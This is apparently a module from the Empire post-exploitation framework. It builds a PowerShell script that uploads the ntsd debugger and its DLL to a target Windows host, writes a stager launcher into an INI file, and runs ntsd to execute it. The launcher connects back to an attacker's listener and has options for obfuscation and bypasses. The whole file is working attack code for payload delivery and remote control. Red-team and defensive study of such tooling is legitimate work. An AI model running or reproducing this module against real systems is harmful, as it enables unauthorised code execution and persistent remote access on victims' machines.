from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        listener_name = params["Listener"]
        upload_path = params["UploadPath"].strip()
        bin = params["BinPath"]
        arch = params["Arch"]
        ntsd_exe_upload_path = upload_path + "\\" + "ntsd.exe"
        ntsd_dll_upload_path = upload_path + "\\" + "ntsdexts.dll"

        if arch == "x64":
            ntsd_exe = (
                main_menu.installPath
                + "/data/module_source/code_execution/ntsd_x64.exe"
            )
            ntsd_dll = (
                main_menu.installPath
                + "/data/module_source/code_execution/ntsdexts_x64.dll"
            )
        elif arch == "x86":
            ntsd_exe = (
                main_menu.installPath
                + "/data/module_source/code_execution/ntsd_x86.exe"
            )
            ntsd_dll = (
                main_menu.installPath
                + "/data/module_source/code_execution/ntsdexts_x86.dll"
            )

        script_end = ""
        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException("Invalid listener: %s" % (listener_name))
        else:
            multi_launcher = main_menu.stagertemplatesv2.new_instance("multi_launcher")
            multi_launcher.options["Listener"] = params["Listener"]
            multi_launcher.options["UserAgent"] = params["UserAgent"]
            multi_launcher.options["Proxy"] = params["Proxy"]
            multi_launcher.options["ProxyCreds"] = params["ProxyCreds"]
            multi_launcher.options["Obfuscate"] = params["Obfuscate"]
            multi_launcher.options["ObfuscateCommand"] = params["ObfuscateCommand"]
            multi_launcher.options["Bypasses"] = params["Bypasses"]
            launcher = multi_launcher.generate()

            if launcher == "":
                raise ModuleValidationException("Error in launcher generation.")
            else:
                launcher = launcher.split(" ")[-1]

                with open(ntsd_exe, "rb") as bin_data:
                    ntsd_exe_data = bin_data.read()

                with open(ntsd_dll, "rb") as bin_data:
                    ntsd_dll_data = bin_data.read()

                exec_write = f'Write-Ini {upload_path} "{launcher}"'
                code_exec = f"{upload_path}\\ntsd.exe -cf {upload_path}\\ntsd.ini {bin}"
                ntsd_exe_upload = main_menu.stagers.generate_upload(
                    ntsd_exe_data, ntsd_exe_upload_path
                )
                ntsd_dll_upload = main_menu.stagers.generate_upload(
                    ntsd_dll_data, ntsd_dll_upload_path
                )

                script_end += "\r\n"
                script_end += ntsd_exe_upload
                script_end += ntsd_dll_upload
                script_end += "\r\n"
                script_end += exec_write
                script_end += "\r\n"
                # this is to make sure everything was uploaded properly
                script_end += "Start-Sleep -s 5"
                script_end += "\r\n"
                script_end += code_exec

        return script, script_end
